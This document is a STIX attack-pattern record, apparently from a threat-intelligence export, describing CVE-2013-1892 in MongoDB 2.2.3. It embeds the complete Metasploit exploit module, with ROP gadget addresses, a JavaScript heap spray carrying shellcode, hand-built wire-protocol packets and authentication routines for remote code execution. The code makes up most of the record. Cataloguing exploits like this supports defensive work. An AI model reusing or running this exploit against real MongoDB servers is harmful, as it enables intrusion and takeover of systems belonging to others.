{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5aa57c33-9a76-414f-aa66-28f7720903b9",
    "created": "2024-08-14T16:57:37.257938Z",
    "modified": "2024-08-14T16:57:37.257942Z",
    "name": "MongoDB nativeHelper.apply Remote Code Execution",
    "description": " This module exploits the nativeHelper feature from spiderMonkey which allows remote code execution by calling it with specially crafted arguments. This module has been tested successfully on MongoDB 2.2.3 on Ubuntu 10.04 and Debian Squeeze. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/mongod_native_helper.rb",
            "external_id": "mongod_native_helper.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1892"
        },
        {
            "source_name": "reference",
            "url": "http://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'         => 'MongoDB nativeHelper.apply Remote Code Execution',\n      'Description'  => %q{\n          This module exploits the nativeHelper feature from spiderMonkey which allows\n        remote code execution by calling it with specially crafted arguments. This module\n        has been tested successfully on MongoDB 2.2.3 on Ubuntu 10.04 and Debian Squeeze.\n      },\n      'Author'         =>\n        [\n          'agix' # @agixid # Vulnerability discovery and Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-1892' ],\n          [ 'OSVDB', '91632' ],\n          [ 'BID', '58695' ],\n          [ 'URL', 'http://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/' ]\n        ],\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          [ 'Linux - mongod 2.2.3 - 32bits',\n            {\n              'Arch' => ARCH_X86,\n              'mmap' => [\n                  0x0816f768,\t# mmap64@plt # from mongod\n                  0x08666d07, # add esp, 0x14 / pop ebx / pop ebp / ret # from mongod\n                  0x31337000,\n                  0x00002000,\n                  0x00000007,\n                  0x00000031,\n                  0xffffffff,\n                  0x00000000,\n                  0x00000000,\n                  0x0816e4c8,\t# memcpy@plt # from mongod\n                  0x31337000,\n                  0x31337000,\n                  0x0c0b0000,\n                  0x00002000\n              ],\n              'ret'     => 0x08055a70, # ret # from mongod\n              'gadget1' => 0x0836e204, # mov eax,DWORD PTR [eax] / call DWORD PTR [eax+0x1c]\n              # These gadgets need to be composed with bytes < 0x80\n              'gadget2' => 0x08457158, # xchg esp,eax / add esp,0x4 / pop ebx / pop ebp / ret <== this gadget must xchg esp,eax and then increment ESP\n              'gadget3' => 0x08351826, # add esp,0x20 / pop esi / pop edi / pop ebp <== this gadget placed before gadget2 increment ESP to escape gadget2\n              'gadget4' => 0x08055a6c, # pop eax / ret\n              'gadget5' => 0x08457158  # xchg esp,eax\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2013-03-24',\n      'License'      => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(27017),\n        OptString.new('DB', [ true, \"Database to use\", \"admin\"]),\n        OptString.new('COLLECTION', [ false, \"Collection to use (it must to exist). Better to let empty\", \"\"]),\n        OptString.new('USERNAME', [ true, \"Login to use\", \"\"]),\n        OptString.new('PASSWORD', [ true, \"Password to use\", \"\"])\n      ])\n  end\n\n  def exploit\n    begin\n      connect\n      if require_auth?\n        print_status(\"Mongo server #{datastore['RHOST']} use authentication...\")\n        if !datastore['USERNAME'] || !datastore['PASSWORD']\n          disconnect\n          fail_with(Failure::BadConfig, \"USERNAME and PASSWORD must be provided\")\n        end\n        if do_login==0\n          disconnect\n          fail_with(Failure::NoAccess, \"Authentication failed\")\n        end\n      else\n        print_good(\"Mongo server #{datastore['RHOST']} doesn't use authentication\")\n      end\n\n      if datastore['COLLECTION'] && datastore['COLLECTION'] != \"\"\n        collection = datastore['COLLECTION']\n      else\n        collection = Rex::Text.rand_text(4, nil, 'abcdefghijklmnopqrstuvwxyz')\n        if read_only?(collection)\n          disconnect\n          fail_with(Failure::BadConfig, \"#{datastore['USERNAME']} has read only access, please provide an existent collection\")\n        else\n          print_good(\"New document created in collection #{collection}\")\n        end\n      end\n\n      print_status(\"Let's exploit, heap spray could take some time...\")\n      my_target = target\n      shellcode = Rex::Text.to_unescape(payload.encoded)\n      mmap = my_target['mmap'].pack(\"V*\")\n      ret = [my_target['ret']].pack(\"V*\")\n      gadget1 = \"0x#{my_target['gadget1'].to_s(16)}\"\n      gadget2 = Rex::Text.to_hex([my_target['gadget2']].pack(\"V\"))\n      gadget3 = Rex::Text.to_hex([my_target['gadget3']].pack(\"V\"))\n      gadget4 = Rex::Text.to_hex([my_target['gadget4']].pack(\"V\"))\n      gadget5 = Rex::Text.to_hex([my_target['gadget5']].pack(\"V\"))\n\n      shellcode_var=\"a\"+Rex::Text.rand_text_hex(4)\n      sizechunk_var=\"b\"+Rex::Text.rand_text_hex(4)\n      chunk_var=\"c\"+Rex::Text.rand_text_hex(4)\n      i_var=\"d\"+Rex::Text.rand_text_hex(4)\n      array_var=\"e\"+Rex::Text.rand_text_hex(4)\n\n      ropchain_var=\"f\"+Rex::Text.rand_text_hex(4)\n      chunk2_var=\"g\"+Rex::Text.rand_text_hex(4)\n      array2_var=\"h\"+Rex::Text.rand_text_hex(4)\n\n      # nopsled + shellcode heapspray\n      payload_js = shellcode_var+'=unescape(\"'+shellcode+'\");'\n      payload_js << sizechunk_var+'=0x1000;'\n      payload_js << chunk_var+'=\"\";'\n      payload_js << 'for('+i_var+'=0;'+i_var+'<'+sizechunk_var+';'+i_var+'++){ '+chunk_var+'+=unescape(\"%u9090%u9090\"); } '\n      payload_js << chunk_var+'='+chunk_var+'.substring(0,('+sizechunk_var+'-'+shellcode_var+'.length));'\n      payload_js << array_var+'=new Array();'\n      payload_js << 'for('+i_var+'=0;'+i_var+'<25000;'+i_var+'++){ '+array_var+'['+i_var+']='+chunk_var+'+'+shellcode_var+'; } '\n\n      # retchain + ropchain heapspray\n      payload_js << ropchain_var+'=unescape(\"'+Rex::Text.to_unescape(mmap)+'\");'\n      payload_js << chunk2_var+'=\"\";'\n      payload_js << 'for('+i_var+'=0;'+i_var+'<'+sizechunk_var+';'+i_var+'++){ '+chunk2_var+'+=unescape(\"'+Rex::Text.to_unescape(ret)+'\"); } '\n      payload_js << chunk2_var+'='+chunk2_var+'.substring(0,('+sizechunk_var+'-'+ropchain_var+'.length));'\n      payload_js << array2_var+'=new Array();'\n      payload_js << 'for('+i_var+'=0;'+i_var+'<25000;'+i_var+'++){ '+array2_var+'['+i_var+']='+chunk2_var+'+'+ropchain_var+'; } '\n\n      # Trigger and first ropchain\n      payload_js << 'nativeHelper.apply({\"x\" : '+gadget1+'}, '\n      payload_js << '[\"A\"+\"'+gadget3+'\"+\"'+Rex::Text.rand_text_hex(12)+'\"+\"'+gadget2+'\"+\"'+Rex::Text.rand_text_hex(28)+'\"+\"'+gadget4+'\"+\"\\\\x20\\\\x20\\\\x20\\\\x20\"+\"'+gadget5+'\"]);'\n\n      request_id = Rex::Text.rand_text(4)\n\n      packet = request_id           #requestID\n      packet << \"\\xff\\xff\\xff\\xff\"   #responseTo\n      packet << \"\\xd4\\x07\\x00\\x00\"  #opCode (2004 OP_QUERY)\n      packet << \"\\x00\\x00\\x00\\x00\"   #flags\n      packet << datastore['DB']+\".\"+collection+\"\\x00\" #fullCollectionName (db.collection)\n      packet << \"\\x00\\x00\\x00\\x00\"   #numberToSkip (0)\n      packet << \"\\x01\\x00\\x00\\x00\"   #numberToReturn (1)\n\n      where = \"\\x02\\x24\\x77\\x68\\x65\\x72\\x65\\x00\"\n      where << [payload_js.length+4].pack(\"L\")\n      where << payload_js+\"\\x00\"\n\n      where.insert(0, [where.length + 4].pack(\"L\"))\n\n      packet += where\n      packet.insert(0, [packet.length + 4].pack(\"L\"))\n\n      sock.put(packet)\n\n      disconnect\n    rescue ::Exception => e\n      fail_with(Failure::Unreachable, \"Unable to connect\")\n    end\n  end\n\n  def require_auth?\n    request_id = Rex::Text.rand_text(4)\n    packet =  \"\\x3f\\x00\\x00\\x00\"   #messageLength (63)\n    packet << request_id           #requestID\n    packet << \"\\xff\\xff\\xff\\xff\"   #responseTo\n    packet << \"\\xd4\\x07\\x00\\x00\"  #opCode (2004 OP_QUERY)\n    packet << \"\\x00\\x00\\x00\\x00\"   #flags\n    packet << \"\\x61\\x64\\x6d\\x69\\x6e\\x2e\\x24\\x63\\x6d\\x64\\x00\" #fullCollectionName (admin.$cmd)\n    packet << \"\\x00\\x00\\x00\\x00\"   #numberToSkip (0)\n    packet << \"\\x01\\x00\\x00\\x00\"   #numberToReturn (1)\n    #query ({\"listDatabases\"=>1})\n    packet << \"\\x18\\x00\\x00\\x00\\x10\\x6c\\x69\\x73\\x74\\x44\\x61\\x74\\x61\\x62\\x61\\x73\\x65\\x73\\x00\\x01\\x00\\x00\\x00\\x00\"\n\n    sock.put(packet)\n    response = sock.get_once\n\n    have_auth_error?(response)\n  end\n\n  def read_only?(collection)\n    request_id = Rex::Text.rand_text(4)\n    _id = \"\\x07_id\\x00\"+Rex::Text.rand_text(12)+\"\\x02\"\n    key = Rex::Text.rand_text(4, nil, 'abcdefghijklmnopqrstuvwxyz')+\"\\x00\"\n    value = Rex::Text.rand_text(4, nil, 'abcdefghijklmnopqrstuvwxyz')+\"\\x00\"\n\n    insert = _id+key+[value.length].pack(\"L\")+value+\"\\x00\"\n\n    packet =  [insert.length+24+datastore['DB'].length+6].pack(\"L\")   #messageLength\n    packet << request_id           #requestID\n    packet << \"\\xff\\xff\\xff\\xff\"   #responseTo\n    packet <<  \"\\xd2\\x07\\x00\\x00\"  #opCode (2002 Insert Document)\n    packet << \"\\x00\\x00\\x00\\x00\"   #flags\n    packet << datastore['DB'] + \".\" + collection + \"\\x00\" #fullCollectionName (DB.collection)\n    packet << [insert.length+4].pack(\"L\")\n    packet << insert\n\n    sock.put(packet)\n\n    request_id = Rex::Text.rand_text(4)\n\n    packet =  [datastore['DB'].length + 61].pack(\"L\")   #messageLength (66)\n    packet << request_id           #requestID\n    packet << \"\\xff\\xff\\xff\\xff\"   #responseTo\n    packet <<  \"\\xd4\\x07\\x00\\x00\"  #opCode (2004 Query)\n    packet << \"\\x00\\x00\\x00\\x00\"   #flags\n    packet << datastore['DB'] + \".$cmd\" + \"\\x00\" #fullCollectionName (DB.$cmd)\n    packet << \"\\x00\\x00\\x00\\x00\"   #numberToSkip (0)\n    packet << \"\\xff\\xff\\xff\\xff\"   #numberToReturn (1)\n    packet << \"\\x1b\\x00\\x00\\x00\"\n    packet << \"\\x01\\x67\\x65\\x74\\x6c\\x61\\x73\\x74\\x65\\x72\\x72\\x6f\\x72\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x3f\\x00\"\n\n    sock.put(packet)\n\n    response = sock.get_once\n    have_auth_error?(response)\n  end\n\n  def do_login\n    print_status(\"Trying #{datastore['USERNAME']}/#{datastore['PASSWORD']} on #{datastore['DB']} database\")\n    nonce = get_nonce\n    status = auth(nonce)\n    return status\n  end\n\n  def auth(nonce)\n    request_id = Rex::Text.rand_text(4)\n    packet =  request_id           #requestID\n    packet << \"\\xff\\xff\\xff\\xff\"   #responseTo\n    packet <<  \"\\xd4\\x07\\x00\\x00\"  #opCode (2004 OP_QUERY)\n    packet << \"\\x00\\x00\\x00\\x00\"   #flags\n    packet << datastore['DB'] + \".$cmd\" + \"\\x00\" #fullCollectionName (DB.$cmd)\n    packet << \"\\x00\\x00\\x00\\x00\"   #numberToSkip (0)\n    packet << \"\\xff\\xff\\xff\\xff\"   #numberToReturn (1)\n\n    #{\"authenticate\"=>1.0, \"user\"=>\"root\", \"nonce\"=>\"94e963f5b7c35146\", \"key\"=>\"61829b88ee2f8b95ce789214d1d4f175\"}\n    document =  \"\\x01\\x61\\x75\\x74\\x68\\x65\\x6e\\x74\\x69\\x63\\x61\\x74\\x65\"\n    document << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x3f\\x02\\x75\\x73\\x65\\x72\\x00\"\n    document << [datastore['USERNAME'].length + 1].pack(\"L\") # +1 due null byte termination\n    document << datastore['USERNAME'] + \"\\x00\"\n    document << \"\\x02\\x6e\\x6f\\x6e\\x63\\x65\\x00\\x11\\x00\\x00\\x00\"\n    document << nonce + \"\\x00\"\n    document << \"\\x02\\x6b\\x65\\x79\\x00\\x21\\x00\\x00\\x00\"\n    document << Rex::Text.md5(nonce + datastore['USERNAME'] + Rex::Text.md5(datastore['USERNAME'] + \":mongo:\" + datastore['PASSWORD'])) + \"\\x00\"\n    document << \"\\x00\"\n    #Calculate document length\n    document.insert(0, [document.length + 4].pack(\"L\"))\n\n    packet += document\n\n    #Calculate messageLength\n    packet.insert(0, [(packet.length + 4)].pack(\"L\"))  #messageLength\n    sock.put(packet)\n    response = sock.get_once\n    if have_auth_error?(response)\n      print_error(\"Bad login or DB\")\n      return 0\n    else\n      print_good(\"Successful login on DB #{datastore['db']}\")\n      return 1\n    end\n\n\n  end\n\n  def get_nonce\n    request_id = Rex::Text.rand_text(4)\n    packet =  [datastore['DB'].length + 57].pack(\"L\")   #messageLength (57+DB.length)\n    packet << request_id           #requestID\n    packet << \"\\xff\\xff\\xff\\xff\"   #responseTo\n    packet <<  \"\\xd4\\x07\\x00\\x00\"  #opCode (2004 OP_QUERY)\n    packet << \"\\x00\\x00\\x00\\x00\"   #flags\n    packet << datastore['DB'] + \".$cmd\" + \"\\x00\" #fullCollectionName (DB.$cmd)\n    packet << \"\\x00\\x00\\x00\\x00\"   #numberToSkip (0)\n    packet << \"\\x01\\x00\\x00\\x00\"   #numberToReturn (1)\n    #query {\"getnonce\"=>1.0}\n    packet << \"\\x17\\x00\\x00\\x00\\x01\\x67\\x65\\x74\\x6e\\x6f\\x6e\\x63\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x3f\\x00\"\n\n    sock.put(packet)\n    response = sock.get_once\n    documents = response[36..1024]\n    #{\"nonce\"=>\"f785bb0ea5edb3ff\", \"ok\"=>1.0}\n    nonce = documents[15..30]\n  end\n\n  def have_auth_error?(response)\n    #Response header 36 bytes long\n    documents = response[36..1024]\n    #{\"errmsg\"=>\"auth fails\", \"ok\"=>0.0}\n    #{\"errmsg\"=>\"need to login\", \"ok\"=>0.0}\n    if documents.include?('errmsg') || documents.include?('unauthorized')\n      return true\n    else\n      return false\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}